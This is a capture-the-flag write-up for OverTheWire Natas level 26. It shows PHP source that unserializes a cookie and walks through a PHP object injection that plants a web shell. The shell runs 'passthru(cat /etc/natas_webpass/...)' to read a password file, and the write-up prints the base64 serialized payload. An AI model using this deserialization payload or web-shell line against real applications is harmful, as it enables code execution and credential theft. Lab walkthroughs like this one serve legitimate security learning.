+++
author = "Alex Domnit"
title = 'Natas-Level 26'
date = 2024-11-23T13:12:26+02:00
draft = false
description = "Writeup"
tags = [
    "CTF",
    "Completed",
]
categories = [
    "Overthewire",
    "Natas",
]

toc = false
+++

### Login
*Username: natas26*\
*Password: cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE*\
*URL:      http://natas26.natas.labs.overthewire.org*

### Doc
Burp Suite is a proprietary software tool for security assessment and penetration testing of web applications. It software was initially developed in 2003-2006 by Dafydd Stuttard to automate his own security testing needs, after realizing the capabilities of automatable web tools like Selenium.
[Source.](https://en.wikipedia.org/wiki/Burp_Suite)\
Burp Suite tutorial and usefull guides:\
[Port Swigger.](https://portswigger.net/burp/documentation/desktop/getting-started)\
[PHP tutorial.](https://www.w3schools.com/php/)


### Solution
The index page presents itself with 4 fields of X\`s and Y\`s that draw 2 lines from the respective coordinates.

<img src="/img/natas/natas26-1.png" alt="gif" style="display: block; margin-left: auto; margin-right: auto;">

**Source code:**
```
<?php
    // sry, this is ugly as hell.
    // cheers kaliman ;)
    // - morla

    class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;

        function __construct($file){
            // initialise variables
            $this->initMsg="#--session started--#\n";
            $this->exitMsg="#--session end--#\n";
            $this->logFile = "/tmp/natas26_" . $file . ".log";

            // write initial message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$this->initMsg);
            fclose($fd);
        }

        function log($msg){
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$msg."\n");
            fclose($fd);
        }

        function __destruct(){
            // write exit message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$this->exitMsg);
            fclose($fd);
        }
    }

    function showImage($filename){
        if(file_exists($filename))
            echo "<img src=\"$filename\">";
    }

    function drawImage($filename){
        $img=imagecreatetruecolor(400,300);
        drawFromUserdata($img);
        imagepng($img,$filename);
        imagedestroy($img);
    }

    function drawFromUserdata($img){
        if( array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){

            $color=imagecolorallocate($img,0xff,0x12,0x1c);
            imageline($img,$_GET["x1"], $_GET["y1"],
                            $_GET["x2"], $_GET["y2"], $color);
        }

        if (array_key_exists("drawing", $_COOKIE)){
            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
            if($drawing)
                foreach($drawing as $object)
                    if( array_key_exists("x1", $object) &&
                        array_key_exists("y1", $object) &&
                        array_key_exists("x2", $object) &&
                        array_key_exists("y2", $object)){

                        $color=imagecolorallocate($img,0xff,0x12,0x1c);
                        imageline($img,$object["x1"],$object["y1"],
                                $object["x2"] ,$object["y2"] ,$color);

                    }
        }
    }

    function storeData(){
        $new_object=array();

        if(array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
            $new_object["x1"]=$_GET["x1"];
            $new_object["y1"]=$_GET["y1"];
            $new_object["x2"]=$_GET["x2"];
            $new_object["y2"]=$_GET["y2"];
        }

        if (array_key_exists("drawing", $_COOKIE)){
            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
        }
        else{
            // create new array
            $drawing=array();
        }

        $drawing[]=$new_object;
        setcookie("drawing",base64_encode(serialize($drawing)));
    }
?>

<h1>natas26</h1>
<div id="content">

Draw a line:<br>
<form name="input" method="get">
X1<input type="text" name="x1" size=2>
Y1<input type="text" name="y1" size=2>
X2<input type="text" name="x2" size=2>
Y2<input type="text" name="y2" size=2>
<input type="submit" value="DRAW!">
</form>

<?php
    session_start();

    if (array_key_exists("drawing", $_COOKIE) ||
        (   array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET))){
        $imgfile="img/natas26_" . session_id() .".png";
        drawImage($imgfile);
        showImage($imgfile);
        storeData();
    }

?>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

**Important takeaway:**

These are some function that we are gonna utilize in the exploit. The application utilizes a **Logger** class but it is not utilized in any way whatsoever.\
We can see that the drawing cookie is being set by base64 encoding the serialization of the img.\
**setcookie("drawing",base64_encode(serialize($drawing)));**

#### What is serialization in PHP?

Generates a storable representation of a value.\
This is useful for storing or passing PHP values around without losing their type and structure.\
To make the serialized string into a PHP value again, use unserialize().\
[Source.](https://www.php.net/manual/en/function.serialize.php)

#### What now?

We can test this by parsing our default cookie through Cyberchef in reverse order and we should get something tangible.

<img src="/img/natas/natas26-2.png" alt="gif" style="display: block; margin-left: auto; margin-right: auto;">

As seen, we get the array representation of the inputed coordinates so in theory, we could reverse the process with whatever value we want for the respective cookie and get a valid running.\
As done before, we can use **<? passthru('cat /etc/natas_webpass/natas27'); ?>** in a PHP file and then run it by accessing it in the tree at the point where we want to save it.\
So, we are gonna create a PHP file that encodes and serializez a PHP snippet, save it as the cookie and then access the password for the next level.

**Payload code:**

<img src="/img/natas/natas26-3.png" alt="gif" style="display: block; margin-left: auto; margin-right: auto;">

**Run with PHP:**
```
02:46:35 archie@Archie pico → php some.php
Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxMToiaW1nL3B3bi5waHAiO3M6MTU6IgBMb2dnZXIAaW5pdE1zZyI7czoxMDoic29tZXRoaW5nCiI7czoxNToiAExvZ2dlcgBleGl0TXNnIjtzOjYxOiI8P3BocCBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCcvZXRjL25hdGFzX3dlYnBhc3MvbmF0YXMyNycpOz8+Ijt9
```

#### Wrapping up

Now that we`ve got the needed cookie, we can launch burp, modify the current cookie with the modified one in the request and then access the generated php file under the /img directory.

<img src="/img/natas/natas26-4.png" alt="gif" style="display: block; margin-left: auto; margin-right: auto;">

After this, let`s check if the PHP file was created.\
Going to /img/pwn2.php in my case reveals the password after running the PHP code.\
**Password for next level:** u3RRffXjysjgwFU6b9xa23i6prmUsYne